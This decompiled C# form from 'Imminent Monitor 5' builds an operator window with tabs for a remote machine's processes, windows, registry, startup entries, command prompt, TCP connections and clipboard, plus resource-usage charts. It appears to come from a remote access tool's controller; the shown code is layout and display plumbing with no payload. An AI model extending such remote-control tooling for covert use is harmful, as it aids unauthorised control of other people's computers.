// Decompiled with JetBrains decompiler
// Type: NewFormSystemManagers
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using CefSharp;
using CefSharp.WinForms;
using ImminentMonitor.Cef;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

[DesignerGenerated]
public sealed class NewFormSystemManagers : Form
{
  private IContainer icontainer_0;
  private GControl6 gcontrol6_0;
  private TabPage tabPage_0;
  private TabPage tabPage_1;
  private UserControlTaskManager userControlTaskManager_0;
  private UserControlWindowManager userControlWindowManager_0;
  private TabPage tabPage_2;
  private TabPage tabPage_3;
  private TabPage tabPage_4;
  private TabPage tabPage_5;
  private TabPage tabPage_6;
  private UserControlRegistryManager userControlRegistryManager_0;
  private UserControlStartup userControlStartup_0;
  private UserControlCommandPrompt userControlCommandPrompt_0;
  private UserControlTCPConnections userControlTCPConnections_0;
  private UserControlCipboard userControlCipboard_0;
  private PictureBox pictureBox_0;
  private Control0 control0_0;
  private ChromiumWebBrowser chromiumWebBrowser_0;
  public GClass18 gclass18_0;

  public NewFormSystemManagers(GClass18 gclass18_1)
  {
    this.Load += new EventHandler(this.NewFormSystemManagers_Load);
    this.FormClosing += new FormClosingEventHandler(this.NewFormSystemManagers_FormClosing);
    this.MinimumSize = new Size(909, 667);
    this.gclass18_0 = gclass18_1;
    this.InitializeComponent();
    this.method_0(gclass18_1);
    this.Text = string.Format("{0}/{1}", (object) this.gclass18_0.method_20().string_15, (object) this.gclass18_0.method_20().string_1);
    Class97.smethod_11((Form) this);
  }

  [DebuggerNonUserCode]
  protected override void Dispose(bool disposing)
  {
    try
    {
      if (!disposing || this.icontainer_0 == null)
        return;
      this.icontainer_0.Dispose();
    }
    finally
    {
      base.Dispose(disposing);
    }
  }

  [DebuggerStepThrough]
  private void InitializeComponent()
  {
    ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (NewFormSystemManagers));
    this.vmethod_31(new PictureBox());
    this.vmethod_1(new GControl6());
    this.vmethod_3(new TabPage());
    this.vmethod_7(new UserControlTaskManager());
    this.vmethod_5(new TabPage());
    this.vmethod_9(new UserControlWindowManager());
    this.vmethod_11(new TabPage());
    this.vmethod_21(new UserControlRegistryManager());
    this.vmethod_13(new TabPage());
    this.vmethod_23(new UserControlStartup());
    this.vmethod_15(new TabPage());
    this.vmethod_25(new UserControlCommandPrompt());
    this.vmethod_17(new TabPage());
    this.vmethod_27(new UserControlTCPConnections());
    this.vmethod_19(new TabPage());
    this.vmethod_29(new UserControlCipboard());
    this.vmethod_33(new Control0());
    ((ISupportInitialize) this.vmethod_30()).BeginInit();
    this.vmethod_0().SuspendLayout();
    this.vmethod_2().SuspendLayout();
    this.vmethod_4().SuspendLayout();
    this.vmethod_10().SuspendLayout();
    this.vmethod_12().SuspendLayout();
    this.vmethod_14().SuspendLayout();
    this.vmethod_16().SuspendLayout();
    this.vmethod_18().SuspendLayout();
    this.SuspendLayout();
    this.vmethod_30().Image = (Image) Class145.smethod_51();
    PictureBox pictureBox1 = this.vmethod_30();
    Point point1 = new Point(160, 571);
    Point point2 = point1;
    pictureBox1.Location = point2;
    this.vmethod_30().Name = "PictureBox6";
    PictureBox pictureBox2 = this.vmethod_30();
    Size size1 = new Size(16, 16);
    Size size2 = size1;
    pictureBox2.Size = size2;
    this.vmethod_30().TabIndex = 35;
    this.vmethod_30().TabStop = false;
    this.vmethod_30().Visible = false;
    this.vmethod_0().Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
    this.vmethod_0().Controls.Add((Control) this.vmethod_2());
    this.vmethod_0().Controls.Add((Control) this.vmethod_4());
    this.vmethod_0().Controls.Add((Control) this.vmethod_10());
    this.vmethod_0().Controls.Add((Control) this.vmethod_12());
    this.vmethod_0().Controls.Add((Control) this.vmethod_14());
    this.vmethod_0().Controls.Add((Control) this.vmethod_16());
    this.vmethod_0().Controls.Add((Control) this.vmethod_18());
    GControl6 gcontrol6_1 = this.vmethod_0();
    point1 = new Point(283, 85);
    Point point3 = point1;
    gcontrol6_1.Location = point3;
    this.vmethod_0().Name = "HiddenTabControlSystemManagers";
    this.vmethod_0().SelectedIndex = 0;
    GControl6 gcontrol6_2 = this.vmethod_0();
    size1 = new Size(889, 599);
    Size size3 = size1;
    gcontrol6_2.Size = size3;
    this.vmethod_0().TabIndex = 4;
    this.vmethod_0().Visible = false;
    this.vmethod_2().BackColor = Color.FromArgb(241, 244, 245);
    this.vmethod_2().Controls.Add((Control) this.vmethod_6());
    TabPage tabPage1 = this.vmethod_2();
    point1 = new Point(0, 0);
    Point point4 = point1;
    tabPage1.Location = point4;
    this.vmethod_2().Name = "TabPageTaskmanager";
    TabPage tabPage2 = this.vmethod_2();
    Padding padding1 = new Padding(3);
    Padding padding2 = padding1;
    tabPage2.Padding = padding2;
    TabPage tabPage3 = this.vmethod_2();
    size1 = new Size(889, 599);
    Size size4 = size1;
    tabPage3.Size = size4;
    this.vmethod_2().TabIndex = 0;
    this.vmethod_2().Text = "TabPage1";
    this.vmethod_6().BackColor = Color.White;
    this.vmethod_6().method_1((GClass18) null);
    this.vmethod_6().Dock = DockStyle.Fill;
    this.vmethod_6().Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    UserControlTaskManager controlTaskManager1 = this.vmethod_6();
    point1 = new Point(3, 3);
    Point point5 = point1;
    controlTaskManager1.Location = point5;
    this.vmethod_6().Name = "UserControlTaskManager1";
    UserControlTaskManager controlTaskManager2 = this.vmethod_6();
    size1 = new Size(883, 593);
    Size size5 = size1;
    controlTaskManager2.Size = size5;
    this.vmethod_6().TabIndex = 0;
    this.vmethod_4().BackColor = Color.FromArgb(241, 244, 245);
    this.vmethod_4().Controls.Add((Control) this.vmethod_8());
    TabPage tabPage4 = this.vmethod_4();
    point1 = new Point(0, 0);
    Point point6 = point1;
    tabPage4.Location = point6;
    this.vmethod_4().Name = "TabPageWindowManager";
    TabPage tabPage5 = this.vmethod_4();
    padding1 = new Padding(3);
    Padding padding3 = padding1;
    tabPage5.Padding = padding3;
    TabPage tabPage6 = this.vmethod_4();
    size1 = new Size(889, 599);
    Size size6 = size1;
    tabPage6.Size = size6;
    this.vmethod_4().TabIndex = 1;
    this.vmethod_4().Text = "TabPage2";
    this.vmethod_8().BackColor = Color.FromArgb(241, 244, 245);
    this.vmethod_8().method_1((GClass18) null);
    this.vmethod_8().Dock = DockStyle.Fill;
    this.vmethod_8().Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    UserControlWindowManager controlWindowManager1 = this.vmethod_8();
    point1 = new Point(3, 3);
    Point point7 = point1;
    controlWindowManager1.Location = point7;
    this.vmethod_8().Name = "UserControlWindowManager1";
    UserControlWindowManager controlWindowManager2 = this.vmethod_8();
    size1 = new Size(883, 593);
    Size size7 = size1;
    controlWindowManager2.Size = size7;
    this.vmethod_8().TabIndex = 0;
    this.vmethod_10().Controls.Add((Control) this.vmethod_20());
    TabPage tabPage7 = this.vmethod_10();
    point1 = new Point(0, 0);
    Point point8 = point1;
    tabPage7.Location = point8;
    this.vmethod_10().Name = "TabPage1";
    TabPage tabPage8 = this.vmethod_10();
    size1 = new Size(889, 599);
    Size size8 = size1;
    tabPage8.Size = size8;
    this.vmethod_10().TabIndex = 2;
    this.vmethod_10().Text = "TabPage1";
    this.vmethod_10().UseVisualStyleBackColor = true;
    this.vmethod_20().BackColor = Color.FromArgb(241, 244, 245);
    this.vmethod_20().method_1((GClass18) null);
    this.vmethod_20().Dock = DockStyle.Fill;
    this.vmethod_20().Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    UserControlRegistryManager controlRegistryManager1 = this.vmethod_20();
    point1 = new Point(0, 0);
    Point point9 = point1;
    controlRegistryManager1.Location = point9;
    this.vmethod_20().Name = "UserControlRegistryManager1";
    UserControlRegistryManager controlRegistryManager2 = this.vmethod_20();
    size1 = new Size(889, 599);
    Size size9 = size1;
    controlRegistryManager2.Size = size9;
    this.vmethod_20().TabIndex = 0;
    this.vmethod_12().Controls.Add((Control) this.vmethod_22());
    TabPage tabPage9 = this.vmethod_12();
    point1 = new Point(0, 0);
    Point point10 = point1;
    tabPage9.Location = point10;
    this.vmethod_12().Name = "TabPage2";
    TabPage tabPage10 = this.vmethod_12();
    size1 = new Size(889, 599);
    Size size10 = size1;
    tabPage10.Size = size10;
    this.vmethod_12().TabIndex = 3;
    this.vmethod_12().Text = "TabPage2";
    this.vmethod_12().UseVisualStyleBackColor = true;
    this.vmethod_22().BackColor = Color.FromArgb(241, 244, 245);
    this.vmethod_22().method_1((GClass18) null);
    this.vmethod_22().Dock = DockStyle.Fill;
    this.vmethod_22().Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    UserControlStartup userControlStartup1 = this.vmethod_22();
    point1 = new Point(0, 0);
    Point point11 = point1;
    userControlStartup1.Location = point11;
    this.vmethod_22().Name = "UserControlStartup1";
    UserControlStartup userControlStartup2 = this.vmethod_22();
    size1 = new Size(889, 599);
    Size size11 = size1;
    userControlStartup2.Size = size11;
    this.vmethod_22().TabIndex = 0;
    this.vmethod_14().Controls.Add((Control) this.vmethod_24());
    TabPage tabPage11 = this.vmethod_14();
    point1 = new Point(0, 0);
    Point point12 = point1;
    tabPage11.Location = point12;
    this.vmethod_14().Name = "TabPage3";
    TabPage tabPage12 = this.vmethod_14();
    size1 = new Size(889, 599);
    Size size12 = size1;
    tabPage12.Size = size12;
    this.vmethod_14().TabIndex = 4;
    this.vmethod_14().Text = "TabPage3";
    this.vmethod_14().UseVisualStyleBackColor = true;
    this.vmethod_24().BackColor = Color.FromArgb(241, 244, 245);
    this.vmethod_24().method_1((GClass18) null);
    this.vmethod_24().Dock = DockStyle.Fill;
    this.vmethod_24().Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    UserControlCommandPrompt controlCommandPrompt1 = this.vmethod_24();
    point1 = new Point(0, 0);
    Point point13 = point1;
    controlCommandPrompt1.Location = point13;
    this.vmethod_24().Name = "UserControlCommandPrompt1";
    UserControlCommandPrompt controlCommandPrompt2 = this.vmethod_24();
    size1 = new Size(889, 599);
    Size size13 = size1;
    controlCommandPrompt2.Size = size13;
    this.vmethod_24().TabIndex = 0;
    this.vmethod_16().Controls.Add((Control) this.vmethod_26());
    TabPage tabPage13 = this.vmethod_16();
    point1 = new Point(0, 0);
    Point point14 = point1;
    tabPage13.Location = point14;
    this.vmethod_16().Name = "TabPage4";
    TabPage tabPage14 = this.vmethod_16();
    size1 = new Size(889, 599);
    Size size14 = size1;
    tabPage14.Size = size14;
    this.vmethod_16().TabIndex = 5;
    this.vmethod_16().Text = "TabPage4";
    this.vmethod_16().UseVisualStyleBackColor = true;
    this.vmethod_26().BackColor = Color.FromArgb(241, 244, 245);
    this.vmethod_26().method_1((GClass18) null);
    this.vmethod_26().Dock = DockStyle.Fill;
    this.vmethod_26().Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    UserControlTCPConnections controlTcpConnections1 = this.vmethod_26();
    point1 = new Point(0, 0);
    Point point15 = point1;
    controlTcpConnections1.Location = point15;
    this.vmethod_26().Name = "UserControlTCPConnections1";
    UserControlTCPConnections controlTcpConnections2 = this.vmethod_26();
    size1 = new Size(889, 599);
    Size size15 = size1;
    controlTcpConnections2.Size = size15;
    this.vmethod_26().TabIndex = 0;
    this.vmethod_18().Controls.Add((Control) this.vmethod_28());
    TabPage tabPage15 = this.vmethod_18();
    point1 = new Point(0, 0);
    Point point16 = point1;
    tabPage15.Location = point16;
    this.vmethod_18().Name = "TabPage5";
    TabPage tabPage16 = this.vmethod_18();
    size1 = new Size(889, 599);
    Size size16 = size1;
    tabPage16.Size = size16;
    this.vmethod_18().TabIndex = 6;
    this.vmethod_18().Text = "TabPage5";
    this.vmethod_18().UseVisualStyleBackColor = true;
    this.vmethod_28().BackColor = Color.FromArgb(241, 244, 245);
    this.vmethod_28().method_1((GClass18) null);
    this.vmethod_28().Dock = DockStyle.Fill;
    this.vmethod_28().Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    UserControlCipboard userControlCipboard1 = this.vmethod_28();
    point1 = new Point(0, 0);
    Point point17 = point1;
    userControlCipboard1.Location = point17;
    this.vmethod_28().Name = "UserControlCipboard1";
    UserControlCipboard userControlCipboard2 = this.vmethod_28();
    size1 = new Size(889, 599);
    Size size17 = size1;
    userControlCipboard2.Size = size17;
    this.vmethod_28().TabIndex = 0;
    this.vmethod_32().Anchor = AnchorStyles.None;
    this.vmethod_32().method_3((Control0.Enum9) 0);
    Control0 control0_1 = this.vmethod_32();
    point1 = new Point(478, 343);
    Point point18 = point1;
    control0_1.Location = point18;
    this.vmethod_32().Name = "Preloader1";
    this.vmethod_32().method_1(5);
    Control0 control0_2 = this.vmethod_32();
    size1 = new Size(229, 10);
    Size size18 = size1;
    control0_2.Size = size18;
    this.vmethod_32().TabIndex = 36;
    this.vmethod_32().Text = "Preloader1";
    this.AutoScaleDimensions = new SizeF(6f, 13f);
    this.AutoScaleMode = AutoScaleMode.Font;
    this.BackColor = Color.FromArgb(241, 244, 245);
    size1 = new Size(1184, 696);
    this.ClientSize = size1;
    this.Controls.Add((Control) this.vmethod_32());
    this.Controls.Add((Control) this.vmethod_30());
    this.Controls.Add((Control) this.vmethod_0());
    this.DoubleBuffered = true;
    this.Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
    this.Name = nameof (NewFormSystemManagers);
    this.StartPosition = FormStartPosition.CenterScreen;
    ((ISupportInitialize) this.vmethod_30()).EndInit();
    this.vmethod_0().ResumeLayout(false);
    this.vmethod_2().ResumeLayout(false);
    this.vmethod_4().ResumeLayout(false);
    this.vmethod_10().ResumeLayout(false);
    this.vmethod_12().ResumeLayout(false);
    this.vmethod_14().ResumeLayout(false);
    this.vmethod_16().ResumeLayout(false);
    this.vmethod_18().ResumeLayout(false);
    this.ResumeLayout(false);
  }

  internal virtual GControl6 vmethod_0() => this.gcontrol6_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_1(GControl6 gcontrol6_1) => this.gcontrol6_0 = gcontrol6_1;

  internal virtual TabPage vmethod_2() => this.tabPage_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_3(TabPage tabPage_7) => this.tabPage_0 = tabPage_7;

  internal virtual TabPage vmethod_4() => this.tabPage_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_5(TabPage tabPage_7) => this.tabPage_1 = tabPage_7;

  internal virtual UserControlTaskManager vmethod_6() => this.userControlTaskManager_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_7(UserControlTaskManager userControlTaskManager_1) => this.userControlTaskManager_0 = userControlTaskManager_1;

  internal virtual UserControlWindowManager vmethod_8() => this.userControlWindowManager_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_9(
    UserControlWindowManager userControlWindowManager_1)
  {
    this.userControlWindowManager_0 = userControlWindowManager_1;
  }

  internal virtual TabPage vmethod_10() => this.tabPage_2;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_11(TabPage tabPage_7) => this.tabPage_2 = tabPage_7;

  internal virtual TabPage vmethod_12() => this.tabPage_3;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_13(TabPage tabPage_7) => this.tabPage_3 = tabPage_7;

  internal virtual TabPage vmethod_14() => this.tabPage_4;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_15(TabPage tabPage_7) => this.tabPage_4 = tabPage_7;

  internal virtual TabPage vmethod_16() => this.tabPage_5;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_17(TabPage tabPage_7) => this.tabPage_5 = tabPage_7;

  internal virtual TabPage vmethod_18() => this.tabPage_6;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_19(TabPage tabPage_7) => this.tabPage_6 = tabPage_7;

  internal virtual UserControlRegistryManager vmethod_20() => this.userControlRegistryManager_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_21(
    UserControlRegistryManager userControlRegistryManager_1)
  {
    this.userControlRegistryManager_0 = userControlRegistryManager_1;
  }

  internal virtual UserControlStartup vmethod_22() => this.userControlStartup_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_23(UserControlStartup userControlStartup_1) => this.userControlStartup_0 = userControlStartup_1;

  internal virtual UserControlCommandPrompt vmethod_24() => this.userControlCommandPrompt_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_25(
    UserControlCommandPrompt userControlCommandPrompt_1)
  {
    this.userControlCommandPrompt_0 = userControlCommandPrompt_1;
  }

  internal virtual UserControlTCPConnections vmethod_26() => this.userControlTCPConnections_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_27(
    UserControlTCPConnections userControlTCPConnections_1)
  {
    this.userControlTCPConnections_0 = userControlTCPConnections_1;
  }

  internal virtual UserControlCipboard vmethod_28() => this.userControlCipboard_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_29(UserControlCipboard userControlCipboard_1)
  {
    MouseEventHandler mouseEventHandler = new MouseEventHandler(this.method_2);
    if (this.userControlCipboard_0 != null)
      this.userControlCipboard_0.MouseClick -= mouseEventHandler;
    this.userControlCipboard_0 = userControlCipboard_1;
    if (this.userControlCipboard_0 == null)
      return;
    this.userControlCipboard_0.MouseClick += mouseEventHandler;
  }

  internal virtual PictureBox vmethod_30() => this.pictureBox_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_31(PictureBox pictureBox_1) => this.pictureBox_0 = pictureBox_1;

  internal virtual Control0 vmethod_32() => this.control0_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_33(Control0 control0_1) => this.control0_0 = control0_1;

  public virtual ChromiumWebBrowser vmethod_34() => this.chromiumWebBrowser_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public virtual void vmethod_35(ChromiumWebBrowser chromiumWebBrowser_1)
  {
    EventHandler<FrameLoadEndEventArgs> eventHandler = new EventHandler<FrameLoadEndEventArgs>(this.method_6);
    if (this.chromiumWebBrowser_0 != null)
      this.chromiumWebBrowser_0.FrameLoadEnd -= eventHandler;
    this.chromiumWebBrowser_0 = chromiumWebBrowser_1;
    if (this.chromiumWebBrowser_0 == null)
      return;
    this.chromiumWebBrowser_0.FrameLoadEnd += eventHandler;
  }

  private void method_0(GClass18 gclass18_1)
  {
    this.vmethod_28().method_1(gclass18_1);
    this.vmethod_6().method_1(gclass18_1);
    this.vmethod_8().method_1(gclass18_1);
    this.vmethod_20().method_1(gclass18_1);
    this.vmethod_22().method_1(gclass18_1);
    this.vmethod_24().method_1(gclass18_1);
    this.vmethod_26().method_1(gclass18_1);
  }

  [MethodImpl(MethodImplOptions.NoOptimization)]
  private void method_1()
  {
    Class97.smethod_28((Form) this);
    string path = string.Format("{0}\\bin\\cef\\site\\base\\html\\imminent\\systemmanagers.html", (object) Application.StartupPath);
    if (!File.Exists(path))
    {
      int num = (int) MessageBox.Show("Error The html file doesn't exists : " + path);
      ProjectData.EndApp();
    }
    this.vmethod_35(new ChromiumWebBrowser(path));
    ((Control) this.vmethod_34()).AllowDrop = false;
    ((Control) this.vmethod_34()).Location = new Point(-1920, -1080);
    ((Control) this.vmethod_34()).Size = new Size(1210, 749);
    ((Control) this.vmethod_34()).Dock = DockStyle.None;
    this.Controls.Add((Control) this.vmethod_34());
    this.vmethod_34().BrowserSettings = new BrowserSettings()
    {
      FileAccessFromFileUrls = (CefState) 1,
      UniversalAccessFromFileUrls = (CefState) 1,
      WebSecurity = (CefState) 1
    };
    this.vmethod_34().RegisterJsObject("systemManagers", (object) new SystemManagerCefHandler(this), (BindingOptions) null);
    this.vmethod_34().RegisterJsObject("processManager", (object) new ProcessCefHandler(this), (BindingOptions) null);
    this.vmethod_34().RegisterJsObject("windowManager", (object) new WindowCefHandler(this), (BindingOptions) null);
  }

  protected override void WndProc(ref Message m)
  {
    base.WndProc(ref m);
    if (m.Msg != Class97.int_0 || (int) m.WParam != Class97.int_3)
      return;
    WebBrowserExtensions.ShowDevTools((IWebBrowser) this.vmethod_34());
  }

  private void NewFormSystemManagers_Load(object sender, EventArgs e) => this.method_1();

  private void NewFormSystemManagers_FormClosing(object sender, FormClosingEventArgs e) => ((Component) this.vmethod_34()).Dispose();

  private void method_2(object sender, MouseEventArgs e)
  {
    if (e.Button != MouseButtons.Middle)
      return;
    WebBrowserExtensions.ShowDevTools((IWebBrowser) this.vmethod_34());
  }

  public void method_3(object[] object_0)
  {
    string string_4 = "populateNetwork(new Array('Download (MBps)',";
    int num1 = object_0.Length - 1;
    double num2;
    for (int index = 2; index <= num1; index += 3)
    {
      if (index == object_0.Length - 3)
      {
        string str1 = string_4;
        num2 = (double) object_0[index + 1];
        string str2 = num2.ToString("0.000");
        string_4 = str1 + "'" + str2 + "'), new Array('Upload (MBps)',";
      }
      else
      {
        string str3 = string_4;
        num2 = (double) object_0[index + 1];
        string str4 = num2.ToString("0.000");
        string_4 = str3 + "'" + str4 + "', ";
      }
    }
    int num3 = object_0.Length - 1;
    for (int index = 2; index <= num3; index += 3)
    {
      if (index == object_0.Length - 3)
      {
        string str5 = string_4;
        num2 = (double) object_0[index + 2];
        string str6 = num2.ToString("0.000");
        string_4 = str5 + "'" + str6 + "'), new Array('times',";
      }
      else
      {
        string str7 = string_4;
        num2 = (double) object_0[index + 2];
        string str8 = num2.ToString("0.000");
        string_4 = str7 + "'" + str8 + "', ";
      }
    }
    int num4 = object_0.Length - 1;
    for (int index = 2; index <= num4; index += 3)
    {
      if (index == object_0.Length - 3)
      {
        DateTime dateTime = NewFormSystemManagers.smethod_0(Conversions.ToDouble(object_0[index]));
        string_4 += string.Format("'{0}-{1}-{2} {3}:{4}:{5}'))", (object) dateTime.Day, (object) dateTime.Month, (object) dateTime.Year, (object) dateTime.Hour, (object) dateTime.Minute, (object) dateTime.Second);
      }
      else
      {
        DateTime dateTime = NewFormSystemManagers.smethod_0(Conversions.ToDouble(object_0[index]));
        string_4 += string.Format("'{0}-{1}-{2} {3}:{4}:{5}', ", (object) dateTime.Day, (object) dateTime.Month, (object) dateTime.Year, (object) dateTime.Hour, (object) dateTime.Minute, (object) dateTime.Second);
      }
    }
    Class97.smethod_20(this.vmethod_34(), string_4);
  }

  public void method_4(object[] object_0)
  {
    string str = "populateSystemGraph(new Array('CPU',";
    int num1 = object_0.Length - 1;
    for (int index = 2; index <= num1; index += 3)
      str = index != object_0.Length - 3 ? Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object) str, object_0[index + 1]), (object) ", ")) : Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object) str, object_0[index + 1]), (object) "), new Array('RAM',"));
    int num2 = object_0.Length - 1;
    for (int index = 2; index <= num2; index += 3)
      str = index != object_0.Length - 3 ? Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object) str, object_0[index + 2]), (object) ", ")) : Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object) str, object_0[index + 2]), (object) "), new Array('times',"));
    int num3 = object_0.Length - 1;
    for (int index = 2; index <= num3; index += 3)
    {
      if (index == object_0.Length - 3)
      {
        DateTime dateTime = NewFormSystemManagers.smethod_0(Conversions.ToDouble(object_0[index]));
        str += string.Format("'{0}-{1}-{2} {3}:{4}:{5}'))", (object) dateTime.Day, (object) dateTime.Month, (object) dateTime.Year, (object) dateTime.Hour, (object) dateTime.Minute, (object) dateTime.Second);
      }
      else
      {
        DateTime dateTime = NewFormSystemManagers.smethod_0(Conversions.ToDouble(object_0[index]));
        str += string.Format("'{0}-{1}-{2} {3}:{4}:{5}', ", (object) dateTime.Day, (object) dateTime.Month, (object) dateTime.Year, (object) dateTime.Hour, (object) dateTime.Minute, (object) dateTime.Second);
      }
    }
    Class97.smethod_20(this.vmethod_34(), str);
  }

  public static DateTime smethod_0(double double_0) => new DateTime(1970, 1, 1, 0, 0, 0, 0, DateTimeKind.Utc).AddSeconds(double_0).ToLocalTime();

  private void method_5()
  {
    Thread.Sleep(300);
    if (this == null)
      return;
    this.Invoke((Delegate) (() =>
    {
      if (this.vmethod_34() == null)
        return;
      ((Control) this.vmethod_34()).Dock = DockStyle.Fill;
      this.vmethod_32().Visible = false;
    }));
  }

  private void method_6(object sender, FrameLoadEndEventArgs e) => new Thread(new ThreadStart(this.method_5)).Start();
}
